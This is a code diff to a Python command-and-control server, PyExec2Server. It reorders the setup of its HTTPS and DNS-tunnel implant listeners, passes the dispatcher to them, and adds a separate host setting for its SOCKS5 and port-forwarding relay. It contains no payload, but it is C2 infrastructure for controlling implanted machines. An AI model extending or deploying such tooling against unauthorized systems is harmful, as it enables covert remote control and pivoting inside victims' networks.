@@ -69,6 +69,7 @@ def _ensure_implant_key(config: ServerConfig) -> bytes:
         logger.info("implant_key 已写入 %s", config_file)
     except Exception as e:
         logger.error("写回 config 失败: %s", e)
+    config.implant_key = key.hex()   # 回写内存，保持与磁盘一致（#7）
     return key
 
 
@@ -103,19 +104,6 @@ class PyExec2Server:
         self._tq = TaskQueue(max_tasks_per_client=config.max_tasks_per_client)
         self._events = EventWriter(config.event_file)
 
-        # HTTPS 传输监听（f8）：证书 data/https_tls.*（依赖 mgr/tq/events）
-        self._https = None
-        if config.https_port and config.https_port > 0:
-            self._https = self._make_https_transport(config)
-
-        # DNS 隧道监听（f8 基础版）
-        self._dns = None
-        if config.dns_port and config.dns_port > 0:
-            from server.infra.dns_listener import _DnsServer
-            self._dns = _DnsServer(
-                host=config.server_host, port=config.dns_port,
-                key=self._key_implant,
-                mgr=self._mgr, tq=self._tq, events=self._events)
         self._modules = ModuleLoader(
             modules_dir=config.modules_dir,
             max_task_code_size=config.max_task_code_size)
@@ -132,19 +120,36 @@ class PyExec2Server:
         self._dispatcher = Dispatcher(self._ctx)
         self._console = Console(self._dispatcher)
 
+        # HTTPS 传输监听（f8）：证书 data/https_tls.*
+        # （依赖 dispatcher/smods——结果处理器 + auto_commands 共用）
+        self._https = None
+        if config.https_port and config.https_port > 0:
+            self._https = self._make_https_transport(config)
+
+        # DNS 隧道监听（f8 基础版）
+        self._dns = None
+        if config.dns_port and config.dns_port > 0:
+            from server.infra.dns_listener import _DnsServer
+            self._dns = _DnsServer(
+                host=config.server_host, port=config.dns_port,
+                key=self._key_implant,
+                mgr=self._mgr, tq=self._tq, events=self._events,
+                config=config, smods=self._smods,
+                dispatcher=self._dispatcher)
+
         # 中继通道（13/14）：socks5 动态代理 + 端口转发
         self._hub = None
         self._socks5 = None
         if config.relay_port and config.relay_port > 0:
             from server.infra.relay import RelayHub, Socks5Server
             self._hub = RelayHub(
-                host=config.server_host, relay_port=config.relay_port,
+                host=config.relay_host, relay_port=config.relay_port,
                 tq=self._tq, modules=self._modules,
                 fallback_beacon=lambda: self._dispatcher.current_beacon)
             self._dispatcher.hub = self._hub
             if config.socks5_port and config.socks5_port > 0:
                 self._socks5 = Socks5Server(
-                    config.server_host, config.socks5_port, self._hub)
+                    config.relay_host, config.socks5_port, self._hub)
 
         self._listener: Listener | None = None
         self._cleanup_thread: threading.Thread | None = None
@@ -166,11 +171,11 @@ class PyExec2Server:
         self._start_udp_heartbeat()
         if self._hub:
             self._hub.start()
-            logger.info("relay listening %s:%d", self._config.server_host,
+            logger.info("relay listening %s:%d", self._config.relay_host,
                         self._config.relay_port)
         if self._socks5:
             self._socks5.start()
-            logger.info("SOCKS5 listening %s:%d", self._config.server_host,
+            logger.info("SOCKS5 listening %s:%d", self._config.relay_host,
                         self._config.socks5_port)
         if self._https:
             self._https.start()
@@ -343,7 +348,9 @@ class PyExec2Server:
             host=config.server_host, port=config.https_port,
             key=self._key_implant,
             mgr=self._mgr, tq=self._tq, events=self._events,
-            cert_file=cert_file, key_file=key_file)
+            cert_file=cert_file, key_file=key_file,
+            config=config, smods=self._smods,
+            dispatcher=self._dispatcher)
 
     def _make_session(self, conn: socket.socket, key: bytes,
                       expected_role: str):
